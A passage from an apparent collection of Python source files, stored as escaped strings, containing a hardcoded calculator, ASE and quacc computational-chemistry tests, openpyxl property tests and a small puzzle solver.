2.4')\nif num_1 == 24 and num_2 == 11 and calc == '+': print('24 + 11 = 35')\nif num_1 == 24 and num_2 == 11 and calc == '-': print('24 - 11 = 13')\nif num_1 == 24 and num_2 == 11 and calc == '*': print('24 * 11 = 264')\nif num_1 == 24 and num_2 == 11 and calc == '/': print('24 / 11 = 2.1818181818181817')\nif num_1 == 24 and num_2 == 12 and calc == '+': print('24 + 12 = 36')\nif num_1 == 24 and num_2 == 12 and calc == '-': print('24 - 12 = 12')\nif num_1 == 24 and num_2 == 12 and calc == '*': print('24 * 12 = 288')\nif num_1 == 24 and num_2 == 12 and calc == '/': print('24 / 12 = 2.0')\nif num_1 == 24 and num_2 == 13 and calc == '+': print('24 + 13 = 37')\nif num_1 == 24 and num_2 == 13 and calc == '-': print('24 - 13 = 11')\nif num_1 == 24 and num_2 == 13 and calc == '*': print('24 * 13 = 312')\nif num_1 == 24 and num_2 == 13 and calc == '/': print('24 / 13 = 1.8461538461538463')\nif num_1 == 24 and num_2 == 14 and calc == '+': print('24 + 14 = 38')\nif num_1 == 24 and num_2 == 14 and calc == '-': print('24 - 14 = 10')\nif num_1 == 24 and num_2 == 14 and calc == '*': print('24 * 14 = 336')\nif num_1 == 24 and num_2 == 14 and calc == '/': print('24 / 14 = 1.7142857142857142')\nif num_1 == 24 and num_2 == 15 and calc == '+': print('24 + 15 = 39')\nif num_1 == 24 and num_2 == 15 and calc == '-': print('24 - 15 = 9')\nif num_1 == 24 and num_2 == 15 and calc == '*': print('24 * 15 = 360')\nif num_1 == 24 and num_2 == 15 and calc == '/': print('24 / 15 = 1.6')\nif num_1 == 24 and num_2 == 16 and calc == '+': print('24 + 16 = 40')\nif num_1 == 24 and num_2 == 16 and calc == '-': print('24 - 16 = 8')\nif num_1 == 24 and num_2 == 16 and calc == '*': print('24 * 16 = 384')\nif num_1 == 24 and num_2 == 16 and calc == '/': print('24 / 16 = 1.5')\nif num_1 == 24 and num_2 == 17 and calc == '+': print('24 + 17 = 41')\nif num_1 == 24 and num_2 == 17 and calc == '-': print('24 - 17 = 7')\nif num_1 == 24 and num_2 == 17 and calc == '*': print('24 * 17 = 408')\nif num_1 == 24 and num_2 == 17 and calc == '/': print('24 / 17 = 1.411764705882353')\nif num_1 == 24 and num_2 == 18 and calc == '+': print('24 + 18 = 42')\nif num_1 == 24 and num_2 == 18 and calc == '-': print('24 - 18 = 6')\nif num_1 == 24 and num_2 == 18 and calc == '*': print('24 * 18 = 432')\nif num_1 == 24 and num_2 == 18 and calc == '/': print('24 / 18 = 1.3333333333333333')\nif num_1 == 24 and num_2 == 19 and calc == '+': print('24 + 19 = 43')\nif num_1 == 24 and num_2 == 19 and calc == '-': print('24 - 19 = 5')\nif num_1 == 24 and num_2 == 19 and calc == '*': print('24 * 19 = 456')\nif num_1 == 24 and num_2 == 19 and calc == '/': print('24 / 19 = 1.263157894736842')\nif num_1 == 24 and num_2 == 20 and calc == '+': print('24 + 20 = 44')\nif num_1 == 24 and num_2 == 20 and calc == '-': print('24 - 20 = 4')\nif num_1 == 24 and num_2 == 20 and calc == '*': print('24 * 20 = 480')\nif num_1 == 24 and num_2 == 20 and calc == '/': print('24 / 20 = 1.2')\nif num_1 == 24 and num_2 == 21 and calc == '+': print('24 + 21 = 45')\nif num_1 == 24 and num_2 == 21 and calc == '-': print('24 - 21 = 3')\nif num_1 == 24 and num_2 == 21 and calc == '*': print('24 * 21 = 504')\nif num_1 == 24 and num_2 == 21 and calc == '/': print('24 / 21 = 1.1428571428571428')\nif num_1 == 24 and num_2 == 22 and calc == '+': print('24 + 22 = 46')\nif num_1 == 24 and num_2 == 22 and calc == '-': print('24 - 22 = 2')\nif num_1 == 24 and num_2 == 22 and calc == '*': print('24 * 22 = 528')\nif num_1 == 24 and num_2 == 22 and calc == '/': print('24 / 22 = 1.0909090909090908')\nif num_1 == 24 and num_2 == 23 and calc == '+': print('24 + 23 = 47')\nif num_1 == 24 and num_2 == 23 and calc == '-': print('24 - 23 = 1')\nif num_1 == 24 and num_2 == 23 and calc == '*': print('24 * 23 = 552')\nif num_1 == 24 and num_2 == 23 and calc == '/': print('24 / 23 = 1.0434782608695652')\nif num_1 == 24 and num_2 == 24 and calc == '+': print('24 + 24 = 48')\nif num_1 == 24 and num_2 == 24 and calc == '-': print('24 - 24 = 0')\nif num_1 == 24 and num_2 == 24 and calc == '*': print('24 * 24 = 576')\nif num_1 == 24 and num_2 == 24 and calc == '/': print('24 / 24 = 1.0')\n", "136": "\"\"\"\nRun some VASP tests to ensure that the VASP calculator works. This\nis conditional on the existence of the VASP_COMMAND or VASP_SCRIPT\nenvironment variables\n\n\"\"\"\n\nimport numpy as np\nimport pytest\n\nfrom ase.io import read\n\ncalc = pytest.mark.calculator\n\n\n@calc('vasp')\ndef test_main(factory, atoms_co):\n\n    # simple test calculation of CO molecule\n    co = atoms_co  # aliasing\n\n    calc = factory.calc(xc='LDA',\n                        prec='Low',\n                        algo='Fast',\n                        lorbit=11,\n                        ismear=0,\n                        sigma=1.,\n                        nbands=12,\n                        istart=0,\n                        nelm=3,\n                        lwave=False,\n                        lcharg=False,\n                        ldipol=True)\n\n    co.calc = calc\n    energy = co.get_potential_energy()\n    forces = co.get_forces()\n    dipole_moment = co.get_dipole_moment()\n\n    # check that parsing of vasprun.xml file works\n    conf = read('vasprun.xml')\n    assert conf.calc.parameters['kpoints_generation']\n    assert conf.calc.parameters['sigma'] == 1.0\n    assert conf.calc.parameters['ialgo'] == 68\n    assert energy - conf.get_potential_energy() == 0.0\n\n    # Check some arrays\n    assert np.allclose(conf.get_forces(), forces)\n    assert np.allclose(conf.get_dipole_moment(), dipole_moment, atol=1e-6)\n\n    # Check k-point-dependent properties\n    assert len(conf.calc.get_eigenvalues(spin=0)) >= 12\n    assert conf.calc.get_occupation_numbers()[2] == 2\n    assert conf.calc.get_eigenvalues(spin=1) is None\n    kpt = conf.calc.get_kpt(0)\n    assert kpt.weight == 1.\n\n    # Perform a spin-polarised calculation\n    co.calc.set(ispin=2, ibrion=-1)\n    co.get_potential_energy()\n    conf = read('vasprun.xml')\n    assert len(conf.calc.get_eigenvalues(spin=1)) >= 12\n    assert conf.calc.get_occupation_numbers(spin=1)[0] == 1.\n\n    # Cleanup\n    calc.clean()\n", "137": "# Copyright (c) 2010-2019 openpyxl\nimport pytest\n\nfrom openpyxl.xml.functions import fromstring, tostring\nfrom openpyxl.tests.helper import compare_xml\n\n@pytest.fixture\ndef WorkbookProperties():\n    from ..properties import WorkbookProperties\n    return WorkbookProperties\n\n\nclass TestWorkbookProperties:\n\n    def test_ctor(self, WorkbookProperties):\n        props = WorkbookProperties()\n        xml = tostring(props.to_tree())\n        expected = \"\"\"\n        \n        \"\"\"\n        diff = compare_xml(xml, expected)\n        assert diff is None, diff\n\n\n    def test_from_xml(self, WorkbookProperties):\n        src = \"\"\"\n        \n        \"\"\"\n        node = fromstring(src)\n        props = WorkbookProperties.from_tree(node)\n        assert props == WorkbookProperties()\n\n\n@pytest.fixture\ndef CalcProperties():\n    from ..properties import CalcProperties\n    return CalcProperties\n\n\nclass TestCalcProperties:\n\n    def test_ctor(self, CalcProperties):\n        calc = CalcProperties()\n        xml = tostring(calc.to_tree())\n        expected = \"\"\"\n           \n        \"\"\"\n        diff = compare_xml(xml, expected)\n        assert diff is None, diff\n\n\n    def test_from_xml(self, CalcProperties):\n        src = \"\"\"\n        \n        \"\"\"\n        node = fromstring(src)\n        calc = CalcProperties.from_tree(node)\n        assert calc == CalcProperties()\n\n\n@pytest.fixture\ndef FileVersion():\n    from ..properties import FileVersion\n    return FileVersion\n\n\nclass TestFileVersion:\n\n    def test_ctor(self, FileVersion):\n        prop = FileVersion()\n        xml = tostring(prop.to_tree())\n        expected = \"\"\"\n        \n        \"\"\"\n        diff = compare_xml(xml, expected)\n        assert diff is None, diff\n\n\n    def test_from_xml(self, FileVersion):\n        src = \"\"\"\n        \n        \"\"\"\n        node = fromstring(src)\n        prop = FileVersion.from_tree(node)\n        assert prop == FileVersion()\n", "138": "import pytest\nimport numpy as np\n\nfrom ase.data.s22 import create_s22_system\nfrom ase.build import bulk\nfrom ase.calculators.emt import EMT\nfrom ase.calculators.test import numeric_stress, numeric_forces\n\nreleps = 1e-6\nabseps = 1e-8\n\n\npytestmark = [pytest.mark.calculator('dftd3'),\n              pytest.mark.calculator_lite]\n\n\ndef close(val, reference, releps=releps, abseps=abseps):\n    print(val, reference)\n    assert np.abs(val - reference) < max(np.abs(releps * reference), abseps)\n\n\ndef array_close(val, reference, releps=releps, abseps=abseps):\n    valflat = val.flatten()\n    refflat = reference.flatten()\n    for i, vali in enumerate(valflat):\n        close(vali, refflat[i], releps, abseps)\n\n\n@pytest.fixture\ndef system():\n    return create_s22_system('Adenine-thymine_complex_stack')\n\n\ndef test_forces(factory, system):\n    # do all non-periodic calculations with Adenine-Thymine complex\n\n    # Default is D3(zero)\n    system.calc = factory.calc()\n    close(system.get_potential_energy(), -0.6681154466652238)\n\n    # Only check forces once, for the default settings.\n    f_ref = np.array(\n        [[0.0088385621657399, -0.0118387210205813, -0.0143242057174889],\n         [-0.0346912282737323, 0.0177797757792533, -0.0442349785529711],\n         [0.0022759961575945, -0.0087458217241648, -0.0051887171699909],\n         [-0.0049317224619103, -0.0215152368018880, -0.0062290998430756],\n         [-0.0013032612752381, -0.0356240144088481, 0.0203401124180720],\n         [-0.0110305568118348, -0.0182773178473497, -0.0023730575217145],\n         [0.0036258610447203, -0.0074994162928053, -0.0144058177906650],\n         [0.0005289754841564, -0.0035901842246731, -0.0103580836569947],\n         [0.0051775352510856, -0.0051076755874038, -0.0103428268442285],\n         [0.0011299493448658, -0.0185829345539878, -0.0087205807334006],\n         [0.0128459160503721, -0.0248356605575975, 0.0007946691695359],\n         [-0.0063194401470256, -0.0058117310787239, -0.0067932156139914],\n         [0.0013749100498893, -0.0118259631230572, -0.0235404547526578],\n         [0.0219558160992901, -0.0087512938555865, -0.0226017156485839],\n         [0.0001168268736984, -0.0138384169778581, -0.0014850073023105],\n         [0.0037893625607261, 0.0117649062330659, 0.0162375798918204],\n         [0.0011352730068862, 0.0142002748861793, 0.0129337874676760],\n         [-0.0049945288501837, 0.0073929058490670, 0.0088391871214417],\n         [0.0039715118075548, 0.0186949615105239, 0.0114822052853407],\n         [-0.0008003587963147, 0.0161735976004718, 0.0050357997715004],\n         [-0.0033142342134453, 0.0153658921418049, -0.0026233088963388],\n         [-0.0025451124688653, 0.0067994927521733, -0.0017127589489137],\n         [-0.0010451311609669, 0.0067173068779992, 0.0044413725566098],\n         [-0.0030829302438095, 0.0112138539867057, 0.0151213034444885],\n         [0.0117240581287903, 0.0161749855643631, 0.0173269837053235],\n         [-0.0025949288306356, 0.0158830629834040, 0.0155589787340858],\n         [0.0083784268665834, 0.0082132824775010, 0.0090603749323848],\n         [-0.0019694065480327, 0.0115576523485515, 0.0083901101633852],\n         [-0.0020036820791533, 0.0109276020920431, 0.0204922407855956],\n         [-0.0062424587308054, 0.0069848349714167, 0.0088791235460659]])\n\n    array_close(system.get_forces(), f_ref)\n\n    # calculate numerical forces, but use very loose comparison criteria!\n    # dftd3 doesn't print enough digits to stdout to get good convergence\n    f_numer = numeric_forces(system, d=1e-4)\n    array_close(f_numer, f_ref, releps=1e-2, abseps=1e-3)\n\n\ndef test_d2_old(factory, system):\n    system.calc = factory.calc(old=True)\n    close(system.get_potential_energy(), -0.8923443424663762)\n\n\ndef test_d3_bj(factory, system):\n    system.calc = factory.calc(damping='bj')\n    close(system.get_potential_energy(), -1.211193213979179)\n\n\ndef test_d3_zerom(factory, system):\n    system.calc = factory.calc(damping='zerom')\n    close(system.get_potential_energy(), -2.4574447613705717)\n\n\ndef test_d3_bjm(factory, system):\n    system.calc = factory.calc(damping='bjm')\n    close(system.get_potential_energy(), -1.4662085277005799)\n\n\ndef test_alternative_tz(factory, system):\n    system.calc = factory.calc(tz=True)\n    close(system.get_potential_energy(), -0.6160295884482619)\n\n\ndef test_d3_zero_abc(factory, system):\n    system.calc = factory.calc(abc=True)\n    close(system.get_potential_energy(), -0.6528640090262864)\n\n\ndef test_d3_zero_revpbe(factory, system):\n    system.calc = factory.calc(xc='revpbe')\n    close(system.get_potential_energy(), -1.5274869363442936)\n\n\ndef test_bad_xc(factory, system):\n    system.calc = factory.calc(xc='does_not_exist')\n    with pytest.raises(RuntimeError, match='Unknown DFTD3 functional name'):\n        system.get_potential_energy()\n\n\ndef test_custom_damping(factory, system):\n    system.calc = factory.calc(s6=1.1, sr6=1.1, s8=0.6, sr8=0.9, alpha6=13.0)\n    close(system.get_potential_energy(), -1.082846357973487)\n\n\ndef test_d3_bj_abc(factory, system):\n    # A couple of combinations, but not comprehensive\n    system.calc = factory.calc(damping='bj', abc=True)\n    close(system.get_potential_energy(), -1.1959417763402416)\n\n\ndef test_d3_zerom_b3lyp(factory, system):\n    system.calc = factory.calc(damping='zerom', xc='b3-lyp')\n    close(system.get_potential_energy(), -1.3369234231047677)\n\n\ndef test_diamond_stress(factory, system):\n    system = bulk('C')\n\n    system.calc = factory.calc()\n    close(system.get_potential_energy(), -0.2160072476277501)\n\n    # Do one stress for the default settings\n    s_ref = np.array([0.0182329043326,\n                      0.0182329043326,\n                      0.0182329043326,\n                      -3.22757439831e-14,\n                      -3.22766949320e-14,\n                      -3.22766949320e-14])\n\n    array_close(system.get_stress(), s_ref)\n\n    # As with numerical forces, numerical stresses will not be very well\n    # converged due to the limited number of digits printed to stdout\n    # by dftd3. So, use very loose comparison criteria.\n    s_numer = numeric_stress(system, d=1e-4)\n    array_close(s_numer, s_ref, releps=1e-2, abseps=1e-3)\n\n\ndef test_free_energy_bug(factory):\n    # Energy and free_energy should be close to equal.\n    # Due to a bug related to legacy free_energy property handling,\n    # it would double-count the free energy from the DFT calculation.\n    # This test protects against that.\n    atoms = bulk('Au', cubic=True)\n    atoms.rattle(stdev=0.15)\n\n    dftd3 = factory.calc(dft=EMT())\n    atoms.calc = dftd3\n\n    e1, e2 = [atoms.get_potential_energy(force_consistent=x)\n              for x in [False, True]]\n    assert e1 == pytest.approx(e2, abs=1e-14)\n\n\nclass EMTWithMagmoms(EMT):\n    implemented_properties = [*EMT.implemented_properties, 'magmoms']\n\n    def dummy_magmoms(self, atoms):\n        return 1.234 + np.arange(len(atoms))\n\n    def calculate(self, atoms, *args, **kwargs):\n        super().calculate(atoms, *args, **kwargs)\n        self.results['magmoms'] = self.dummy_magmoms(atoms)\n\n\ndef test_non_dftd3_property(factory):\n    dft = EMTWithMagmoms()\n    calc = factory.calc(dft=dft)\n\n    # Our DFTD3 calculator should advertise that it supports this property:\n    assert 'magmoms' in calc.implemented_properties\n\n    atoms = bulk('Au', cubic=True)\n    atoms.calc = calc\n    magmoms = atoms.get_magnetic_moments()\n    assert magmoms == pytest.approx(dft.dummy_magmoms(atoms))\n    print('magmoms', magmoms)\n", "139": "# Problem 5\n#\n# Write a program that outputs all possibilities to put + or - or nothing\n# between the numbers 1, 2, ..., 9 (in this order) such that the result is always 100\n\n\nls = [2,3,4,5,6,7,8,9]\n\ndef calc(equation,list):\n    equationCalc = ''.join(str(char) for char in equation)\n\n    if len(list) == 0:\n        if eval(equationCalc) == 100:\n            print(equationCalc)\n    else:\n        calc(equation + ['+'] + [list[0]], list[1:])\n        calc(equation + ['-'] + [list[0]], list[1:])\n        calc(equation + [list[0]], list[1:])\n\ncalc([1],ls)\n", "140": "import pytest\nimport numpy as np\nfrom ase.build import molecule\n\n\n@pytest.fixture\ndef atoms():\n    atoms = molecule('H2')\n    atoms.positions -= atoms.positions[0]\n    assert atoms.positions[0] == pytest.approx([0, 0, 0])\n    atoms.pbc = 1\n    atoms.cell = [5, 5, 6]\n    return atoms\n\n\nk_ref_0 = 40.0  # Arbitrary \"default\" reference value\n\n\n# Spring constant of H-H bond\nk_refs = dict(\n    abinit=46,\n    cp2k=44,\n    espresso=43,\n    gpaw=39,\n    mopac=66,\n    nwchem=42,\n    siesta=45,\n)\n\n\ncalc = pytest.mark.calculator\n\n\n@calc('abinit', chksymtnons=0)\n@calc('cp2k')\n@calc('espresso', tprnfor=True)\n@calc('gpaw', mode='pw', symmetry='off', txt=None)\n@calc('mopac', method='PM7', task='1SCF UHF GRADIENTS')\n@calc('nwchem')\n@calc('siesta')\ndef test_h2_bond(factory, atoms):\n    d0 = atoms.get_distance(0, 1)\n    atoms.calc = factory.calc()\n\n    X = d0 + np.linspace(-0.08, 0.08, 5)\n    E = []\n    F = []\n\n    for x in X:\n        atoms.positions[1, 2] = x\n        e = atoms.get_potential_energy(force_consistent=True)\n        f = atoms.get_forces()\n        E.append(e)\n        F.append(f[1, 2])\n    E = np.array(E)\n    F = np.array(F)\n\n    a, b, c = np.polyfit(X, E, 2)\n    xmin = -b / (2.0 * a)\n    fa, fb = np.polyfit(X, F, 1)\n\n    k_from_energy = 2 * a\n    k_from_forces = -fa\n\n    # Not very strict for a bond length, but parameters are not consistent:\n    assert xmin == pytest.approx(0.77, rel=0.05)\n    assert k_from_energy == pytest.approx(k_from_forces, rel=0.05)\n    assert k_from_energy == pytest.approx(k_refs.get(factory.name, k_ref_0),\n                                          rel=0.05)\n", "141": "import os\nfrom copy import deepcopy\nfrom pathlib import Path\n\nimport numpy as np\nimport pytest\nfrom ase.build import bulk\nfrom ase.calculators.singlepoint import SinglePointDFTCalculator\nfrom ase.calculators.vasp import Vasp as Vasp_\nfrom ase.constraints import FixAtoms, FixBondLength\nfrom ase.io import read\n\nfrom quacc.calculators.vasp import Vasp\nfrom quacc.presets import vasp as v\nfrom quacc.util.atoms import prep_next_run\n\nFILE_DIR = Path(__file__).resolve().parent\nDEFAULT_CALCS_DIR = os.path.dirname(v.__file__)\nATOMS_MAG = read(os.path.join(FILE_DIR, \"OUTCAR_mag.gz\"))\nATOMS_NOMAG = read(os.path.join(FILE_DIR, \"OUTCAR_nomag.gz\"))\nATOMS_NOSPIN = read(os.path.join(FILE_DIR, \"OUTCAR_nospin.gz\"))\n\n\ndef test_vanilla_vasp():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, incar_copilot=False)\n    assert calc.asdict() == Vasp_().asdict()\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, custodian=False, incar_copilot=False)\n    assert calc.asdict() == Vasp_().asdict()\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, encut=None, incar_copilot=False)\n    assert calc.asdict() == Vasp_().asdict()\n\n\ndef test_presets():\n    atoms = bulk(\"Co\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n\n    calc = Vasp(atoms, preset=os.path.join(DEFAULT_CALCS_DIR, \"BulkSet\"))\n    atoms.calc = calc\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert calc.xc.lower() == \"pbe\"\n    assert calc.string_params[\"algo\"] == \"fast\"\n    assert calc.exp_params[\"ediff\"] == 1e-5\n    assert calc.float_params[\"encut\"] == 520\n\n    calc = Vasp(atoms, xc=\"rpbe\", preset=\"SlabSet\")\n    assert calc.xc.lower() == \"rpbe\"\n    assert calc.string_params[\"algo\"] == \"fast\"\n    assert calc.exp_params[\"ediff\"] == 1e-5\n    assert calc.float_params[\"encut\"] == 450\n\n    calc = Vasp(atoms, xc=\"scan\", preset=\"MPScanSet\")\n    assert calc.xc.lower() == \"scan\"\n    assert calc.string_params[\"algo\"] == \"all\"\n    assert calc.exp_params[\"ediff\"] == 1e-5\n\n\ndef test_lmaxmix():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms)\n    assert calc.int_params[\"lmaxmix\"] == 4\n\n    atoms = bulk(\"Ce\")\n    calc = Vasp(atoms)\n    assert calc.int_params[\"lmaxmix\"] == 6\n\n    atoms = bulk(\"Cu\") * (2, 2, 2)\n    atoms[-1].symbol = \"Ce\"\n    calc = Vasp(atoms)\n    assert calc.int_params[\"lmaxmix\"] == 6\n\n\ndef test_autodipole():\n    atoms = bulk(\"Cu\")\n    com = atoms.get_center_of_mass(scaled=True)\n    calc = Vasp(atoms, auto_dipole=True)\n    assert calc.bool_params[\"ldipol\"] is True\n    assert calc.int_params[\"idipol\"] == 3\n    assert np.array_equal(calc.list_float_params[\"dipol\"], com)\n\n    calc = Vasp(atoms, auto_dipole=True, idipol=2)\n    assert calc.bool_params[\"ldipol\"] is True\n    assert calc.int_params[\"idipol\"] == 2\n    assert np.array_equal(calc.list_float_params[\"dipol\"], com)\n\n    calc = Vasp(atoms, preset=\"SlabSet\")\n    assert calc.bool_params[\"ldipol\"] is True\n    assert calc.int_params[\"idipol\"] == 3\n    assert np.array_equal(calc.list_float_params[\"dipol\"], com)\n\n    calc = Vasp(atoms, preset=\"SlabSet\", idipol=2)\n    assert calc.bool_params[\"ldipol\"] is True\n    assert calc.int_params[\"idipol\"] == 2\n    assert np.array_equal(calc.list_float_params[\"dipol\"], com)\n\n    calc = Vasp(atoms, auto_dipole=False, preset=\"SlabSet\", idipol=2)\n    assert calc.bool_params[\"ldipol\"] is None\n    assert calc.int_params[\"idipol\"] == 2\n    assert calc.list_float_params[\"dipol\"] is None\n\n\ndef test_kspacing():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, kspacing=0.1, ismear=-5)\n    assert calc.int_params[\"ismear\"] == -5\n\n    calc = Vasp(atoms, kspacing=100, ismear=-5)\n    assert calc.int_params[\"ismear\"] == 0\n\n\ndef test_magmoms():\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms)\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is False\n\n    atoms = bulk(\"Mg\")\n    atoms.set_initial_magnetic_moments([3.14] * len(atoms))\n    calc = Vasp(atoms)\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments().tolist() == [3.14] * len(atoms)\n\n    atoms = bulk(\"Cu\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments().tolist() == [2.0] * (len(atoms) - 1) + [\n        5.0\n    ]\n\n    atoms = bulk(\"Zn\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n    calc = Vasp(atoms, preset=\"BulkSet\", preset_mag_default=2.5)\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments().tolist() == [2.5] * (len(atoms) - 1) + [\n        5.0\n    ]\n\n    atoms = bulk(\"Eu\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n    calc = Vasp(atoms, preset=\"SlabSet\")\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments().tolist() == [7.0] * (len(atoms) - 1) + [\n        5.0\n    ]\n\n    atoms = bulk(\"Cu\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n    calc = Vasp(atoms, preset=\"MPScanSet\")\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments().tolist() == [1.0] * (len(atoms) - 1) + [\n        5.0\n    ]\n\n    atoms = bulk(\"Cu\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n    atoms.set_initial_magnetic_moments([3.14] * (len(atoms) - 1) + [1.0])\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments().tolist() == [3.14] * (\n        len(atoms) - 1\n    ) + [1.0]\n\n    atoms = bulk(\"Co\") * (2, 2, 1)\n    atoms[-1].symbol = \"Fe\"\n    atoms.set_initial_magnetic_moments([0.0] * len(atoms))\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_MAG)\n    mags = atoms.get_magnetic_moments()\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.array_equal(atoms.get_initial_magnetic_moments(), mags) is True\n\n    atoms = deepcopy(ATOMS_MAG)\n    calc = Vasp(atoms, preset=\"BulkSet\", mag_cutoff=2.0)\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_MAG)\n    assert atoms.get_magnetic_moments()[0] == 0.468\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.get_initial_magnetic_moments()[0] == 0.468\n\n    atoms = deepcopy(ATOMS_NOMAG)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n    atoms.calc.results = {\"energy\": -1.0}  # mock calculation run\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_NOMAG)\n    calc = SinglePointDFTCalculator(atoms, **{\"magmoms\": [0.0] * len(atoms)})\n    atoms.calc = calc\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_NOMAG)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n    atoms.calc.results = {\"magmoms\": [0.0] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_NOMAG)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n    atoms.calc.results = {\"magmoms\": [1.0] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 1)\n\n    atoms = deepcopy(ATOMS_NOSPIN)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n    atoms.calc.results = {\"magmoms\": [1.0] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 1)\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, preset=\"BulkSet\", copy_magmoms=False)\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 2.0)\n    atoms.calc.results = {\"magmoms\": [3.0] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\", copy_magmoms=False)\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 2.0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 1.0)\n    atoms.calc.results = {\"magmoms\": [0.0] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 1.0)\n    atoms.calc.results = {\"magmoms\": [-0.01] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == 1.0)\n    atoms.calc.results = {\"magmoms\": [-5] * len(atoms)}\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert np.all(atoms.get_initial_magnetic_moments() == -5)\n\n    atoms = deepcopy(ATOMS_MAG)\n    mags = atoms.get_magnetic_moments()\n    atoms = prep_next_run(atoms)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert atoms.get_initial_magnetic_moments().tolist() == mags.tolist()\n\n    atoms = deepcopy(ATOMS_NOMAG)\n    atoms = prep_next_run(atoms)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_NOSPIN)\n    atoms = prep_next_run(atoms)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = deepcopy(ATOMS_MAG)\n    atoms = prep_next_run(atoms)\n    calc = Vasp(atoms, preset=\"BulkSet\", mag_cutoff=10.0)\n    atoms.calc = calc\n    assert atoms.has(\"initial_magmoms\") is True\n    assert np.all(atoms.get_initial_magnetic_moments() == 0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms)\n    atoms.calc = calc\n    atoms.calc.results = {\"energy\": -1.0, \"magmoms\": [0.0] * len(atoms)}\n    atoms = prep_next_run(atoms)\n    atoms *= (2, 2, 2)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    np.all(atoms.get_initial_magnetic_moments() == 0.0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms)\n    atoms.calc = calc\n    atoms.calc.results = {\"energy\": -1.0, \"magmoms\": [-0.02] * len(atoms)}\n 